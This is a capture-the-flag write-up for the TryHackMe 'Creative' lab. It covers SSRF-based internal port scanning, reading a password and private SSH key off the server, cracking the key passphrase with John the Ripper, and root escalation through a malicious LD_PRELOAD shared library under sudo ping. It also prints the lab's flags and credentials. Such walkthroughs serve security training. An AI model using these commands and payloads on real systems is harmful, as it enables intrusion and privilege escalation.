# TryHackMe - Creative Writeup

## Enumeration

We start by identifying the target IP and mapping the provided hostnames to our `/etc/hosts` file.

```bash
echo "10.49.180.1 creative.thm beta.creative.thm" | sudo tee -a /etc/hosts
```

An initial Nmap scan reveals two open ports:
- **22/tcp**: SSH
- **80/tcp**: HTTP

Accessing `http://creative.thm` shows a static website. However, checking `http://beta.creative.thm` reveals a "URL Tester" application.

## Web Exploitation

### Server-Side Request Forgery (SSRF)

The URL Tester allows us to input a URL to check if it's alive. This presents a potential Server-Side Request Forgery (SSRF) vector. Testing `http://localhost` returns the HTML of the main page, confirming the vulnerability.

We can use this SSRF to scan internal ports on `localhost`. 

```bash
for port in {1..10000}; do
  curl -s -X POST http://beta.creative.thm -d "url=http://localhost:$port" 
done
```

This scan reveals that port **1337** is open. Querying `http://localhost:1337` via the SSRF vulnerability returns a directory listing of the root filesystem (`/`), indicating a web server is running locally and serving the entire filesystem.

### Extracting Information via SSRF

By navigating the directory listing through the SSRF, we can explore the file system and gather sensitive information:

1. **User Flag**: We can read the user flag directly from `/home/saad/user.txt`.
   - User Flag: `9a1ce90a7653d74ab98630b47b8b4a84`

2. **Bash History**: Checking `/home/saad/.bash_history` reveals a previously executed command that exposes a hardcoded password:
   - `echo "saad:MyStrongestPasswordYet$4291" > creds.txt`

3. **SSH Key**: Exploring the `.ssh` directory at `/home/saad/.ssh/id_rsa` exposes the user's private SSH key. We can save this output to a local file.

## Initial Access

We save the retrieved SSH private key to a file (e.g., `id_rsa_saad`) and set the proper permissions (`chmod 600 id_rsa_saad`). Attempting to use it prompts for a passphrase. 

To bypass this, we use `ssh2john` to extract the hash and crack it with John the Ripper using the `rockyou.txt` wordlist:

```bash
ssh2john id_rsa_saad > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The cracked passphrase is `sweetness`. We can use `ssh-keygen -p` to remove the passphrase, or just use it during login.

We can now log in via SSH as the user `saad`:

```bash
ssh -i id_rsa_saad saad@10.49.180.1
```

## Privilege Escalation

Checking our sudo privileges with `sudo -l` (using the password `MyStrongestPasswordYet$4291` found earlier) reveals:

```text
Matching Defaults entries for saad on ip-10-49-180-1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-49-180-1:
    (root) /usr/bin/ping
```

The user can run the `ping` command as root. Crucially, the `LD_PRELOAD` environment variable is preserved (`env_keep+=LD_PRELOAD`). This allows us to load a custom shared library before any other libraries when executing `ping`.

We can exploit this by writing a malicious C program that sets the UID/GID to 0 (root) and spawns a shell or reads the root flag.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("cat /root/root.txt > /tmp/root.txt && chmod 666 /tmp/root.txt");
}
```

Compile the C code into a shared object (`.so`) file:

```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Upload the compiled shared library to the target machine (e.g., to `/tmp/pe.so`) using SCP. Finally, execute the allowed `ping` command as `sudo` while pointing `LD_PRELOAD` to our malicious library:

```bash
sudo LD_PRELOAD=/tmp/pe.so ping -c 1 127.0.0.1
```

The library executes our payload, copying the root flag to `/tmp/root.txt` with world-readable permissions. Reading the file gives us the final flag:

- Root Flag: `992bfd94b90da48634aed182aae7b99f`
